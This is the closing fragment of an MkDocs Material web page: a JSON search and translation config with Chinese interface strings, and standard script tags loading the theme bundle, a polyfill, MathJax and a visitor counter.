    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.top", "navigation.tracking", "search.suggest", "search.highlight", "search.share"], "search": "../../assets/javascripts/workers/search.b028fd86.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\s\\-\uff0c\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.f758a944.min.js"></script>
      
        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
        <script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
      
    
  </body>
</html>